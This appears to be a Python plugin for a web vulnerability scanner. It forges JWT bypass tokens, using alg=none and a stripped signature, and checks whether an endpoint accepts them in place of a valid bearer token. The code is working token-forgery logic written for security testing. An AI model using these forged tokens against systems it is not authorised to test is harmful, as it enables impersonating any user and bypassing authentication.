"""
attacks/jwt_attacks.py — JWT verification flaws.

If an identity carries a bearer JWT, forge two classic bypass tokens and see if the
server accepts them on an endpoint the valid token can reach:

  * alg=none  — header re-signed with {"alg":"none"} and an empty signature.
  * stripped signature — header.payload with the signature removed.

Effect oracle: the forged token returns a real (2xx, non-login) response equivalent
to the valid token's — i.e. the signature is not actually verified.
"""
from __future__ import annotations

import base64
import json
from typing import List, Optional

from attacks.base import AttackPlugin, AttackContext, register
from attacks.broken_auth import is_login_page, _same_body, _nonempty
from core.models import Request, Finding, Evidence, VulnClass, Severity, Confidence


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _is_jwt(token: str) -> bool:
    parts = token.split(".")
    if len(parts) != 3:
        return False
    try:
        hdr = json.loads(_b64url_decode(parts[0]))
        return isinstance(hdr, dict) and "alg" in hdr
    except Exception:
        return False


def _bearer_jwt(idn) -> Optional[str]:
    for k, v in (idn.headers or {}).items():
        if k.lower() == "authorization" and str(v).lower().startswith("bearer "):
            tok = str(v).split(" ", 1)[1].strip()
            if _is_jwt(tok):
                return tok
    return None


def _forge(token: str) -> list:
    """Return [(label, forged_token)] bypass variants."""
    h, p, _s = token.split(".")
    out = []
    try:
        payload = _b64url_decode(p)
        none_hdr = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
        out.append(("alg=none", f"{none_hdr}.{_b64url(payload)}."))
    except Exception:
        pass
    out.append(("stripped-signature", f"{h}.{p}."))
    return out


@register
class JwtAttacksPlugin(AttackPlugin):
    vuln_class = VulnClass.JWT
    name = "jwt_attacks"
    identity_agnostic = True   # manages the JWT identity internally; run once

    def applies_to(self, ep) -> bool:
        return ep.method == "GET"

    def run(self, ctx: AttackContext) -> List[Finding]:
        ep = ctx.endpoint
        holder = next((i for i in ctx.identities if _bearer_jwt(i)), None)
        if not holder:
            return []
        token = _bearer_jwt(holder)
        url = ctx.url()

        valid = ctx.send(Request("GET", url, headers={"Authorization": f"Bearer {token}"},
                                 label="valid-jwt"), ctx.anon())
        if not (valid.ok and _nonempty(valid.body) and not is_login_page(valid)):
            return []   # the valid token doesn't reach real data here → nothing to bypass

        # Guard: if a clearly-bogus NON-JWT token is also accepted, the endpoint doesn't
        # validate tokens at all → that's broken_auth, not a JWT signature flaw. Skip.
        garbage = ctx.send(Request("GET", url, headers={"Authorization": "Bearer not.a.jwt"},
                                   label="garbage-token"), ctx.anon())
        if garbage.ok and not is_login_page(garbage) and _same_body(garbage.body, valid.body):
            return []

        for label, forged in _forge(token):
            req = Request("GET", url, headers={"Authorization": f"Bearer {forged}"}, label=f"jwt:{label}")
            r = ctx.send(req, ctx.anon())
            if r.ok and not is_login_page(r) and _same_body(r.body, valid.body):
                return [Finding(
                    vuln_class=self.vuln_class, severity=Severity.CRITICAL, confidence=Confidence.HIGH,
                    title=f"JWT signature not verified ({label}) on {ep.key}",
                    endpoint_key=ep.key, identity="anon",
                    detail=(f"A forged JWT ({label}) was accepted and returned the same protected data "
                            f"as the legitimate token. The server does not verify the token signature, "
                            f"so anyone can mint a token for any user/role.\n\n"
                            f"Forged token used:\n{forged}"),
                    evidence=Evidence(request=req, response=r, baseline_response=valid,
                                      # Echo the forged token here too: it lives only in the
                                      # Authorization header, which BOTH the curl repro and the
                                      # persisted JSON mask as a credential — so without this the
                                      # finding can't be reproduced. This token is one we minted,
                                      # not the user's session, so it is safe to show.
                                      note=f"forged {label} token accepted: {forged}"),
                    source=self.name)]
        return []
